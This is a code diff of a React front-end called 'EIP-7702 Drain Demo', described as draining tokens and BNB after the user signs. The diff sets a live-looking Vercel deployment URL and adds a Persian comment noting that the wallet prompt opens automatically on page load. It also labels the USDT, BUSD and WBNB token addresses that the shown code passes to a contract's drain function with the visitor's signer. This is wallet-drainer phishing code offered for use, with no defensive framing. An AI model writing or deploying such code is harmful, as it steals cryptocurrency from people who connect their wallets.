@@ -1,5 +1,4 @@
-
-import { useEffect } from "react";
+import React, { useEffect } from "react";
 import {
   createWeb3Modal,
   defaultConfig,
@@ -16,8 +15,8 @@ const projectId = "450851819c4009f3503181729123df01";
 const metadata = {
   name: "EIP-7702 Drain Demo",
   description: "Drain tokens & BNB after sign",
-  url: "https://yourapp.vercel.app",
-  icons: ["https://yourapp.vercel.app/icon.png"]
+  url: "https://eip7702-sign-drain.vercel.app",
+  icons: ["https://eip7702-sign-drain.vercel.app/icon.png"]
 };
 
 const ethersConfig = defaultConfig({
@@ -39,7 +38,7 @@ function App() {
   const { walletProvider } = useWeb3ModalProvider();
 
   useEffect(() => {
-    open();
+    open(); // کیف پول رو باز می‌کنه به‌محض بارگذاری صفحه
   }, []);
 
   const drainTokens = async () => {
@@ -54,9 +53,9 @@ function App() {
 
       const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       const tokens = [
-        "0x55d398326f99059fF775485246999027B3197955",
-        "0xe9e7cea3dedca5984780bafc599bd69add087d56",
-        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
+        "0x55d398326f99059fF775485246999027B3197955", // USDT
+        "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
+        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"  // WBNB
       ];
 
       const tx = await contract.drain(tokens);
